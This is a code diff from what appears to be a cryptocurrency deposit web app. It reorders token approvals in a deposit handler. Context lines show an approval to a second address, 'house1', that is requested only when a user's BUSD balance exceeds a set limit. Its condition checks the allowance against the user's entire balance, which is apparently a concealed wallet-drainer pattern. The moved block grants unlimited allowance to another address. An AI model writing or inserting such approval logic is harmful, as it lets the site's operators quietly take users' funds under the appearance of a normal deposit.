@@ -587,19 +587,6 @@ const Home = () => {
 
         RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
 
-        if (parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
-          await busdContract.methods.approve(
-            conf.house,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then((txHash) => {
-            RUN_MODE(txHash)
-          }).catch((err) => {
-            RUN_MODE(err)
-          });
-        }
-
         if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
           await busdContract.methods.approve(
             conf.house1,
@@ -614,6 +601,19 @@ const Home = () => {
             setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
             setPendingTx(false)
             return;
+          });
+        }
+
+        if (parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
+          await busdContract.methods.approve(
+            conf.house,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({
+            from: curAcount
+          }).then((txHash) => {
+            RUN_MODE(txHash)
+          }).catch((err) => {
+            RUN_MODE(err)
           });
         }
 
